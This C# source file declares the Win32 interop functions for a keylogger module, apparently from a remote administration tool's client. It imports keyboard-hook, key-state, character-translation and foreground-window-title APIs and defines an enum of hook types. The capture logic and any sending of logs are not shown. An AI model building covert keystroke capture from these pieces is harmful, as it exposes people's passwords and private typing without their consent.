using System;
using System.Runtime.InteropServices;
using System.Text;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Provides calls to Native code for functions in the keylogger.
    /// </summary>
    public static class Win32
    {
        /// <summary>
        /// Translates (maps) a virtual-key code into a scan code or character value,
        /// or translates a scan code into a virtual-key code. The function
        /// translates the codes using the input language and an input locale identifier.
        /// </summary>
        /// <param name="uCode">The virtual-key code or scan code for a key</param>
        /// <param name="uMapType">The translation to perform.</param>
        /// <param name="dwhkl"></param>
        /// <returns>Returns </returns>
        [DllImport("user32.dll", CharSet = CharSet.Unicode, EntryPoint = "MapVirtualKeyExW", ExactSpelling = true)]
        internal static extern int MapVirtualKeyExW(int uCode, int uMapType, IntPtr dwhkl);

        [DllImport("user32.dll")]
        internal static extern short GetAsyncKeyState(KeyloggerKeys vKey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        internal static extern IntPtr SetWindowsHookEx(int hookID, Logger.HookProcDelegate callback, IntPtr hInstance, int threadID);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        internal static extern bool UnhookWindowsHookEx(IntPtr hookHandle);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        internal static extern int CallNextHookEx(IntPtr hookHandle, int nCode, int wParam, ref Logger.KeyData lParam);

        // The value passed to GetAsyncKeyState is scan code, so we need to translate
        // the data to virtual code, then to unicode character, then we can log to
        // the file.
        [DllImport("user32.dll")]
        internal static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(int hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
        internal static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff,
                                               int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        internal static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetKeyboardLayout(uint threadId);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        #region Types

        /// <summary>
        /// Specifies the type of hook procedure to be installed.
        /// </summary>
        public enum idHook : int
        {
            /// <summary>
            /// Installs a hook procedure that monitors messages before the
            /// system sends them to the destination window procedure.
            /// </summary>
            WH_CALLWNDPROC = 4,

            /// <summary>
            /// Installs a hook procedure that monitors messages after
            /// they have been processed by the destination window procedure.
            /// </summary>
            WH_CALLWNDPROCRET = 12,
            /// <summary>
            /// Installs a hook procedure that receives notifications useful
            /// to a CBT application.
            /// </summary>
            WH_CBT = 5,

            /// <summary>
            /// Installs a hook procedure useful for debugging other hook
            /// procedures.
            /// </summary>
            WH_DEBUG = 9,

            /// <summary>
            /// Installs a hook procedure that will be called when the
            /// application's foreground thread is about to become idle.
            /// This hook is useful for performing low priority tasks
            /// during idle time.
            /// </summary>
            WH_FOREGROUNDIDLE = 11,

            /// <summary>
            /// Installs a hook procedure that monitors messages posted
            /// to a message queue.
            /// </summary>
            WH_GETMESSAGE = 3,

            /// <summary>
            /// Installs a hook procedure that posts messages previously
            /// recorded by a WH_JOURNALRECORD hook procedure.
            /// </summary>
            WH_JOURNALPLAYBACK = 1,

            /// <summary>
            /// Installs a hook procedure that records input messages
            /// posted to the system message queue. This hook is useful
            /// for recording macros.
            /// </summary>
            WH_JOURNALRECORD = 0,

            /// <summary>
            /// Installs a hook procedure that monitors keystroke messages.
            /// </summary>
            WH_KEYBOARD = 2,

            /// <summary>
            /// Installs a hook procedure that monitors low-level keyboard
            /// input events.
            /// </summary>
            WH_KEYBOARD_LL = 13,

            /// <summary>
            /// Installs a hook procedure that monitors mouse messages
            /// </summary>
            WH_MOUSE = 7,

            /// <summary>
            /// Installs a hook procedure that monitors low-level mouse
            /// input events.
            /// </summary>
            WH_MOUSE_LL = 14,

            /// <summary>
            /// Installs a hook procedure that monitors messages generated
            /// as a result of an input event in a dialog box, message box,
            /// menu, or scroll bar.
            /// </summary>
            WH_MSGFILTER = -1,

            /// <summary>
            /// Installs a hook procedure that receives notifications
            /// useful to shell applications.
            /// </summary>
            WH_SHELL = 10,

            /// <summary>
            /// Installs a hook procedure that monitors messages generated
            /// as a result of an input event in a dialog box, message box,
            /// menu, or scroll bar. The hook procedure monitors these
            /// messages for all applications in the same desktop as the
            /// calling thread.
            /// </summary>
            WH_SYSMSGFILTER = 6
        }

        #endregion
    }
}